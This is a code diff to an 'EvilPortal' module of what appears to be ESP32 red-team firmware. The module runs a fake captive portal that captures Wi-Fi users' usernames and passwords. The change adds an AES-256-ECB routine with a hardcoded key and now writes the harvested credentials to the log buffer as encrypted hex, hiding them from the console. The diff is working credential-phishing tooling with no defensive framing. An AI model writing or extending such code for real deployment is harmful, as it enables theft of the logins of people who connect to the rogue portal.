@@ -1,4 +1,48 @@
 #include "EvilPortal.h"
+#include <mbedtls/aes.h>
+
+static void encryptAndLog(String data, Buffer& buffer_obj) {
+    // 32-byte key for AES-256
+    // In production, this should be derived from a secure source or unique device ID
+    const unsigned char key[32] = "USBARMYKNIFEREDTEAMOPERATIONS!!"; 
+    
+    mbedtls_aes_context aes;
+    mbedtls_aes_init(&aes);
+    mbedtls_aes_setkey_enc(&aes, key, 256);
+
+    // PKCS7 Padding
+    int len = data.length();
+    int padded_len = (len / 16 + 1) * 16;
+    unsigned char* input = (unsigned char*)malloc(padded_len);
+    unsigned char* output = (unsigned char*)malloc(padded_len);
+    
+    memset(input, 0, padded_len);
+    memcpy(input, data.c_str(), len);
+    
+    uint8_t padding = padded_len - len;
+    for (int i = len; i < padded_len; i++) {
+        input[i] = padding;
+    }
+
+    for (int i = 0; i < padded_len; i += 16) {
+        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, input + i, output + i);
+    }
+
+    String hexOutput = "";
+    for (int i = 0; i < padded_len; i++) {
+        char buf[3];
+        sprintf(buf, "%02x", output[i]);
+        hexOutput += buf;
+    }
+    hexOutput += "\n";
+
+    buffer_obj.append(hexOutput); // Write encrypted hex string
+
+    free(input);
+    free(output);
+    mbedtls_aes_free(&aes);
+}
+
 
 AsyncWebServer server(80);
 
@@ -328,9 +372,9 @@ void EvilPortal::main(uint8_t scan_mode) {
       String logValue1 =
           "u: " + this->user_name;
       String logValue2 = "p: " + this->password;
-      String full_string = logValue1 + " " + logValue2 + "\n";
-      esp32m_print(full_string);
-      buffer_obj.append(full_string);
+      String full_string = logValue1 + " " + logValue2;
+      esp32m_print("Credentials Captured (Encrypted)");
+      encryptAndLog(full_string, buffer_obj);
       #ifdef HAS_SCREEN
         this->sendToDisplay(full_string);
       #endif
